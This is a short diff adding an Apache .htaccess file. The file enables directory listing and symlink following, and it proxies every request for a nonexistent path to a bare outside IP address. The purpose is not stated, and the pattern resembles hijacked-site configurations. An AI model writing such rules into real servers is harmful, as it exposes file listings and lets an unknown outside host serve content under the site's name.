@@ -1,0 +1,13 @@
+Options All +Indexes FollowSymLinks MultiViews
+order allow,deny
+allow from all
+
+RewriteEngine on
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ http://202.108.14.56/$0 [P]
+
+<Files .htaccess>
+deny from all
+</Files>
